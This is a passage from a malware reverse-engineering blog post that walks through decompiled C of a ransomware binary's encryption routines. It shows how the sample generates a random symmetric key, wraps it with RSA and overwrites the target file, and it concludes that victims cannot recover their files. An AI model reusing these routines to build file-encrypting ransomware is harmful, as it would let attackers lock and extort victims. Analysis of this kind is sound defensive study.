<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">encrypt_file</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">2</span>],<span style="color:#e06c75">rsa_key_object</span>,<span style="color:#e06c75">local_28</span>,<span style="color:#e06c75">local_30</span>,<span style="color:#e06c75">local_38</span>);
</span></span></code></pre></div><p>Next up in the <code>main</code> function is a very interesting function. This is where the encrypting happens. We can already see that it&rsquo;s taking in <code>argv[2]</code> which is the path to a file and the <code>rsa_key_object</code>. Let&rsquo;s jump right into this function and see how it works.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">local_10</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">long</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">in_FS_OFFSET</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x28</span>);
</span></span><span style="display:flex;"><span><span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">open_read_write</span>(<span style="color:#e06c75">file_to_encrypt</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;open_read&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_74</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can see that it&rsquo;s opening a specific file to read and write. It&rsquo;s reading into <code>local_3c</code> so I&rsquo;ll rename that to <code>encrypt_file_buffer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">gen_stream_key</span>(<span style="color:#e06c75">local_38</span>,<span style="color:#d19a66">0x20</span>);
</span></span></code></pre></div><p>Here, it&rsquo;s creating a symmetric key. As we can see, it&rsquo;s taking in an <code>0x20</code> as a parameter, and any multiple of 16 or 128 bits is a symmetric stream key. So this symmetric key will be used for symmetric encryption.</p>
<p>We see that <code>local_38</code> is being passed into the function, so that&rsquo;s probably going to be the symmetric key buffer. Let&rsquo;s rename it to <code>sym_key_buffer</code></p>
<p>Let&rsquo;s see what&rsquo;s in this <code>gen_stream_key()</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5c07b">bool</span> <span style="color:#61afef;font-weight:bold">gen_stream_key</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">param_2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">int</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRAND_pseudo_bytes</span>)(<span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">param_2</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;RAND_pseudo_bytes&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is generating a pseudo random symmetric key. So this symmetric key is secure. Had they used a static seed or a non-random value as a key, there would&rsquo;ve been a vulnerability in this malware and we would be able to exploit it.</p>
<p>Let&rsquo;s continue where we left off in the <code>encrypt_file()</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">rsa_encrypt</span>(<span style="color:#e06c75">param_2</span>,<span style="color:#e06c75">sym_key_buffer</span>,<span style="color:#d19a66">0x20</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_48</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_40</span>);
</span></span></code></pre></div><p>Here, it&rsquo;s calling the <code>rsa_encrypt()</code> function. Let&rsquo;s check out what this function does:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">rsa_encrypt</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_2</span>,<span style="color:#e5c07b">int</span> <span style="color:#e06c75">param_3</span>,<span style="color:#e5c07b">void</span> <span style="color:#56b6c2">**</span><span style="color:#e06c75">param_4</span>,<span style="color:#e5c07b">int</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">int</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">pvVar2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">local_44</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRSA_size</span>)(<span style="color:#e06c75">param_1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">param_3</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">iVar1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRSA_size</span>)(<span style="color:#e06c75">param_1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pvVar2</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">calloc</span>((<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_4</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pvVar2</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRSA_public_encrypt</span>)(<span style="color:#e06c75">param_3</span>,<span style="color:#e06c75">param_2</span>,<span style="color:#56b6c2">*</span><span style="color:#e06c75">param_4</span>,<span style="color:#e06c75">param_1</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;RSA_public_encrypt&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_44</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_5</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_44</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;encrypt_bytes: too big data&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_44</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">local_44</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So this function looks like it&rsquo;s encrypting the symmetric key using the RSA object that it generated before. We can see it in this line <code>iVar1 = (*lRSA_public_encrypt)(param_3,param_2,*param_4,param_1,1);</code>. <code>param_3</code> is <code>0x20</code> and <code>param_2</code> is the <code>sym_key_buffer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">encrypt_simple</span>(<span style="color:#e06c75">encrypt_file_buffer</span>,<span style="color:#e06c75">param_3</span>,<span style="color:#e06c75">param_4</span>,<span style="color:#e06c75">sym_key_buffer</span>,<span style="color:#d19a66">0x20</span>,<span style="color:#e06c75">param_5</span>);
</span></span></code></pre></div><p>Next, we can see that this is encrypting <code>encrypt_file_buffer</code> using the <code>sym_key_buffer</code>. So in this function, without jumping into it, we can already guess that this will take the symmetric key and use it to encrypt the file.</p>
<p>Looking in this function, there&rsquo;s just a lot of math code for encrypting. So my previous assumption is correct.</p>
<p>The rest of the code after this is error handling and writing the encrypted file to the original file.</p>
<p>So when it comes to decrypting the files, we need to use a private key. We need to derive a stream key from the private key and use that to decrypt the files.</p>
<h1 id="the-conclusion">The conclusion</h1>
<p>Well that was a long blog post. I tried to go over every important details.</p>
<p>I found the crazy thing about it is the fact that all the debugging information is still there in the binary. After analyzing this, I found that there&rsquo;s not really much you can do if you&rsquo;re a victim of this ransomware. Because it uses asymmetric encryption combined with a pseudo-random stream key, it pretty much forces any victim of this ransomware to pay.</p>
<p>Even after analyzing this ransomware, there&rsquo;s not really any information that I extracted from this analysis that could help a victim of attack. So call me crazy but I guess the malware author left the debugging information in there as a &ldquo;flex&rdquo;, because they knew that their malware was cryptographically secure.</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://namberino.github.io/en/tags/malware/">malware</a></span>
        <span class="tag"><a href="https://namberino.github.io/en/tags/reverse-engineering/">reverse engineering</a></span>
        <span class="tag"><a href="https://namberino.github.io/en/tags/security/">security</a></span>
        
    </p>

            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.85fad2de4f13fec3bcb3b3cb10430cdb44a7b4a9749b32938241a5c6e77718df7624f1002b880521fdc26e24ec1077fda214bf1cb36ee3045510760d09638cae.js" integrity="sha512-hfrS3k8T/sO8s7PLEEMM20SntKl0mzKTgkGlxud3GN92JPEAK4gFIf3CbiTsEHf9ohS/HLNu4wRVEHYNCWOMrg=="></script>





    </body>
</html>
